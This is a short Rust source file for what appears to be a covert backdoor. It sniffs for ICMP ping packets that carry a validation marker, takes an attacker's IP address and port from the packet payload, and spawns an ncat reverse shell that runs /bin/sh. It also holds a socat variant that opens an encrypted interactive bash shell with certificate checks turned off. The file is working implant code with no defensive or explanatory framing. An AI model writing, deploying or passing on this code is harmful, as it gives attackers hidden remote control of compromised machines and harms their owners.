use std::net::Ipv4Addr;
use std::process::Command;

use icmp_rust::VALIDATION_BYTES;
use sniffer::sniff;

mod sniffer;


const  DEBUG: bool = true;

fn ping_detected(payload: Vec<u8>){
    let ip = Ipv4Addr::new(payload[VALIDATION_BYTES.len()],payload[VALIDATION_BYTES.len() + 1],payload[VALIDATION_BYTES.len() + 2],payload[VALIDATION_BYTES.len() + 3]);
    let port = payload[VALIDATION_BYTES.len() + 4] as u16 * 256 + payload[VALIDATION_BYTES.len() + 5] as u16;
    if DEBUG {
        println!("ip: {}", ip);
        println!("port: {}", port);
    }
    open_ncat_connection( ip.to_string(), port.to_string());
}

fn open_ncat_connection(ip :String, port: String){
    Command::new("ncat")
        .arg(ip)
        .arg(port)
        .arg("-e")
        .arg("/bin/sh")
        // Specify the standard IO handles for the child process
        // Spawn the child process
        .spawn().expect("Ncat failed");
}
fn open_socat_connection(ip: String, port: String){
    Command::new("socat")
        .arg(format!("openssl-connect:{}:{},verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane", ip, port))
        .spawn()
        .expect("Socat Failed");

}

fn main() {
    //TODO better way to choose interface
    sniff(true, None, None, ping_detected);
}
